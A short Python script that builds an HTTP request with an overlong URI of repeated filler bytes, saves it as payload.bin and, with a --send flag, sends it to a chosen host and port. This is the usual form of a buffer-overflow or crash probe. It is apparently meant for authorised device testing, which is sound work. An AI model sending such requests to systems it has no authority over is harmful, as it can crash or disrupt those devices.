#!/usr/bin/env python3
"""Generate a controlled long-URI HTTP request for validation.

The script writes payload.bin by default. Network transmission requires --send.
Use only on devices you own or are authorized to test.
"""
import argparse
import socket
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=10080)
parser.add_argument("--length", type=int, default=440)
parser.add_argument("--byte", default='A')
parser.add_argument("--send", action="store_true")
args = parser.parse_args()
fill = args.byte.encode("ascii")[:1]
request = (b"GET /" + fill * args.length + b" HTTP/1.1\r\n" +
           f"Host: {args.host}\r\nConnection: close\r\n\r\n".encode())
Path("payload.bin").write_bytes(request)
print(f"wrote {len(request)} bytes to payload.bin")
if args.send:
    with socket.create_connection((args.host, args.port), timeout=5) as s:
        s.sendall(request)
        try:
            print(s.recv(4096))
        except socket.timeout:
            print("connection closed or no response before timeout")
